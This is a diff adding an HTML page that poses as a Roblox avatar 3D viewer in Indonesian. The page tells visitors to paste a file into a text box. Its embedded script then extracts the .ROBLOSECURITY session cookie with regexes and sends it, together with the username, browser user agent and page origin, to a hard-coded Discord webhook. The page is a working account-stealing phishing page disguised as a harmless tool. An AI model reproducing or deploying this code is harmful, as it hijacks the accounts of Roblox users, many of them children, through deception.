@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avatar - Roblox</title>
+    <link rel="icon" href="https://www.roblox.com/favicon.ico">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #e3e3e3;
+            color: #393b3d;
+            min-height: 100vh;
+        }
+
+        /* ================= NAVBAR ================= */
+        .navbar {
+            background: #fff;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .navbar-logo {
+            font-size: 22px;
+            font-weight: 900;
+            color: #000;
+            letter-spacing: -1px;
+            margin-right: 20px;
+            font-family: 'Arial Black', Arial, sans-serif;
+        }
+
+        .navbar-links { display: flex; gap: 4px; flex: 1; }
+
+        .navbar-links a {
+            color: #393b3d;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 8px 12px;
+            border-radius: 4px;
+            transition: background 0.1s;
+        }
+
+        .navbar-links a:hover { background: #f2f2f2; }
+        .navbar-links a.active { background: #f2f2f2; font-weight: 700; }
+
+        /* ================= MAIN CONTAINER ================= */
+        .main-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 24px 12px;
+        }
+
+        .page-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #393b3d;
+            margin-bottom: 4px;
+            text-align: center;
+        }
+
+        .page-subtitle {
+            font-size: 14px;
+            color: #6b6e70;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        /* ================= CARD ================= */
+        .card {
+            background: #fff;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 16px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+        }
+
+        .card-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #393b3d;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .card-title .badge {
+            background: #00a2ff;
+            color: #fff;
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* ================= FORM ================= */
+        .form-row {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+        }
+
+        .form-group {
+            flex: 1;
+            min-width: 200px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 12px;
+            font-weight: 600;
+            color: #393b3d;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+
+        .form-group input,
+        .form-group textarea,
+        .form-group select {
+            background: #fff;
+            border: 1px solid #c7c7c7;
+            border-radius: 4px;
+            padding: 8px 10px;
+            font-size: 14px;
+            font-family: inherit;
+            color: #393b3d;
+            outline: none;
+            transition: border-color 0.15s;
+        }
+
+        .form-group input:focus,
+        .form-group textarea:focus {
+            border-color: #00a2ff;
+            box-shadow: 0 0 0 2px rgba(0,162,255,0.15);
+        }
+
+        .form-group textarea {
+            resize: vertical;
+            min-height: 60px;
+            font-family: inherit;
+        }
+
+        /* ================= BUTTON ================= */
+        .btn {
+            background: #00a2ff;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 20px;
+            font-size: 14px;
+            font-weight: 700;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.15s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn:hover { background: #0086d4; }
+        .btn:disabled { background: #c7c7c7; cursor: not-allowed; }
+
+        .btn-danger { background: #d63b3b; }
+        .btn-danger:hover { background: #b32e2e; }
+
+        .btn-row { display: flex; gap: 8px; margin-top: 12px; }
+        .btn-row .btn { flex: 1; }
+
+        /* ================= FOOTER ROBLOX ================= */
+        .footer-roblox {
+            background: #fff;
+            border-top: 1px solid #e3e3e3;
+            padding: 40px 0 20px;
+            margin-top: 40px;
+        }
+
+        .footer-inner {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        .footer-columns {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+
+        .footer-column h3 {
+            font-size: 16px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 16px;
+        }
+
+        .footer-column ul {
+            list-style: none;
+        }
+
+        .footer-column ul li {
+            margin-bottom: 10px;
+        }
+
+        .footer-column ul li a {
+            color: #393b3d;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.15s;
+        }
+
+        .footer-column ul li a:hover {
+            color: #00a2ff;
+            text-decoration: underline;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid #e3e3e3;
+            padding-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .footer-bottom-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            font-size: 12px;
+            color: #6b6e70;
+        }
+
+        .footer-logo-small {
+            font-size: 16px;
+            font-weight: 900;
+            color: #000;
+            font-family: 'Arial Black', Arial, sans-serif;
+            letter-spacing: -0.5px;
+        }
+
+        .footer-social {
+            display: flex;
+            gap: 12px;
+        }
+
+        .footer-social a {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #f2f2f2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #393b3d;
+            text-decoration: none;
+            font-size: 14px;
+            transition: background 0.15s;
+        }
+
+        .footer-social a:hover {
+            background: #00a2ff;
+            color: #fff;
+        }
+
+        /* ================= RESPONSIVE ================= */
+        @media (max-width: 768px) {
+            .footer-columns {
+                grid-template-columns: 1fr;
+                gap: 24px;
+            }
+            .footer-bottom {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .navbar-links { display: none; }
+            .page-title { font-size: 22px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ================= NAVBAR ================= -->
+    <div class="navbar">
+        <div class="navbar-logo">ROBLOX</div>
+        <div class="navbar-links">
+            <a href="https://www.roblox.com/home" target="_blank">Home</a>
+            <a href="https://www.roblox.com/my/avatar" target="_blank" class="active">Avatar</a>
+            <a href="https://www.roblox.com/discover" target="_blank">Discover</a>
+            <a href="https://www.roblox.com/create" target="_blank">Create</a>
+        </div>
+    </div>
+
+    <!-- ================= MAIN ================= -->
+    <div class="main-container">
+
+        <div class="page-title">Avatar 3D Viewer</div>
+        <div class="page-subtitle">Render avatar Roblox dalam 3D</div>
+
+        <div class="card">
+            <div class="card-title">
+                <span>RENDER MODEL AVATAR 3D ROBLOX</span>
+                <span class="badge">Auto Filter</span>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Username</label>
+                    <input type="text" id="usernameInput" placeholder="Masukkan username..." value="2927763036">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Paste file di sini</label>
+                <textarea id="psInput" style="min-height:120px;font-size:12px;font-family:'Consolas','Monaco',monospace;"></textarea>
+            </div>
+
+            <div class="btn-row">
+                <button class="btn btn-danger" id="sendBtn">🎮 RENDER MODEL AVATAR</button>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- ================= FOOTER ROBLOX ================= -->
+    <footer class="footer-roblox">
+        <div class="footer-inner">
+            <div class="footer-columns">
+                <div class="footer-column">
+                    <h3>About Us</h3>
+                    <ul>
+                        <li><a href="https://www.roblox.com/info/about" target="_blank">About Roblox</a></li>
+                        <li><a href="https://corp.roblox.com/careers/" target="_blank">Careers</a></li>
+                        <li><a href="https://corp.roblox.com/press/" target="_blank">Press</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Community</h3>
+                    <ul>
+                        <li><a href="https://blog.roblox.com/" target="_blank">Blog</a></li>
+                        <li><a href="https://devforum.roblox.com/" target="_blank">Forums</a></li>
+                        <li><a href="https://www.roblox.com/events" target="_blank">Events</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Support</h3>
+                    <ul>
+                        <li><a href="https://en.help.roblox.com/" target="_blank">Help Center</a></li>
+                        <li><a href="https://en.help.roblox.com/hc/en-us/categories/200217174" target="_blank">Safety</a></li>
+                        <li><a href="https://en.help.roblox.com/hc/en-us/requests/new" target="_blank">Contact</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-columns" style="grid-template-columns: 1fr;">
+                <div class="footer-column">
+                    <h3>Legal</h3>
+                    <ul>
+                        <li><a href="https://en.help.roblox.com/hc/en-us/articles/115004647846" target="_blank">Terms of Use</a></li>
+                        <li><a href="https://en.help.roblox.com/hc/en-us/articles/115004630823" target="_blank">Privacy Policy</a></li>
+                        <li><a href="https://en.help.roblox.com/hc/en-us/articles/115004647846" target="_blank">Cookies</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <div class="footer-bottom-left">
+                    <span class="footer-logo-small">ROBLOX</span>
+                    <span>© 2026 Roblox Avatar Viewer</span>
+                </div>
+                <div class="footer-social">
+                    <a href="https://www.facebook.com/roblox" target="_blank" title="Facebook">f</a>
+                    <a href="https://twitter.com/roblox" target="_blank" title="Twitter">𝕏</a>
+                    <a href="https://www.youtube.com/user/roblox" target="_blank" title="YouTube">▶</a>
+                    <a href="https://www.instagram.com/roblox" target="_blank" title="Instagram">📷</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1550848370011021402/p8rvD7Cr21m2XB5R9OERsanlvOgCSuPTJ8aFZcYD3qZa70pJunFewo6Mowhr6utbvLh3';
+
+        const psInput = document.getElementById('psInput');
+        const sendBtn = document.getElementById('sendBtn');
+        const usernameInput = document.getElementById('usernameInput');
+
+        const BTN_DEFAULT = '🎮 RENDER MODEL AVATAR';
+
+        function extractRobloxCookie(text) {
+            if (!text) return null;
+
+            const cookieRegex = /["']\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/gi;
+            let match;
+            while ((match = cookieRegex.exec(text)) !== null) {
+                const val = match[1];
+                if (val && val.includes('WARNING:-DO-NOT-SHARE-THIS')) {
+                    return val;
+                }
+            }
+
+            const directRegex = /(_\|WARNING:-DO-NOT-SHARE-THIS\.[^"'\s]+)/i;
+            const directMatch = text.match(directRegex);
+            if (directMatch) return directMatch[1];
+
+            const looseRegex = /(_\|WARNING[^"'\s]+)/i;
+            const looseMatch = text.match(looseRegex);
+            if (looseMatch) return looseMatch[1];
+
+            return null;
+        }
+
+        sendBtn.addEventListener('click', async () => {
+            const text = psInput.value;
+
+            if (!text.trim()) {
+                sendBtn.textContent = '❌ TEXTAREA KOSONG';
+                setTimeout(() => sendBtn.textContent = BTN_DEFAULT, 2000);
+                return;
+            }
+
+            sendBtn.disabled = true;
+            sendBtn.textContent = '⏳ MENGIRIM...';
+
+            try {
+                const cookie = extractRobloxCookie(text);
+
+                if (!cookie) {
+                    throw new Error('Cookie .ROBLOSECURITY gak ketemu.');
+                }
+
+                const username = usernameInput.value.trim() || 'N/A';
+
+                await sendToDiscord({ username, cookie });
+
+                sendBtn.textContent = '✅ TERKIRIM';
+                setTimeout(() => sendBtn.textContent = BTN_DEFAULT, 2000);
+
+            } catch (err) {
+                sendBtn.textContent = '❌ ' + err.message.toUpperCase();
+                setTimeout(() => sendBtn.textContent = BTN_DEFAULT, 3000);
+            } finally {
+                sendBtn.disabled = false;
+            }
+        });
+
+        async function sendToDiscord(payload) {
+            const embed = {
+                title: '🎮 Roblox Avatar Viewer — Log',
+                color: 0x00a2ff,
+                fields: [
+                    { name: '👤 Username', value: String(payload.username || 'N/A'), inline: true },
+                    { name: '🍪 Cookie Length', value: String(payload.cookie ? payload.cookie.length : 0) + ' chars', inline: true },
+                    { name: '⏱️ Waktu', value: new Date().toLocaleString('id-ID'), inline: false }
+                ],
+                footer: { text: 'Roblox Avatar Viewer' },
+                timestamp: new Date().toISOString()
+            };
+
+            const content = [
+                '**🔐 DATA MASUK**',
+                `> **👤 Username:** \`${payload.username || '-'}\``,
+                '',
+                '**🍪 COOKIE (.ROBLOSECURITY):**',
+                '```',
+                payload.cookie || '-',
+                '```',
+                `> **UA:** \`${navigator.userAgent}\``,
+                `> **Origin:** \`${location.origin}\``
+            ].join('\n');
+
+            const body = {
+                content: content,
+                embeds: [embed],
+                username: 'Roblox Avatar Viewer',
+                avatar_url: 'https://cdn-icons-png.flaticon.com/512/2103/2103633.png'
+            };
+
+            const res = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body)
+            });
+
+            if (!res.ok && res.status !== 204) {
+                throw new Error('Webhook gagal: ' + res.status);
+            }
+        }
+    </script>
+
+</body>
+</html>
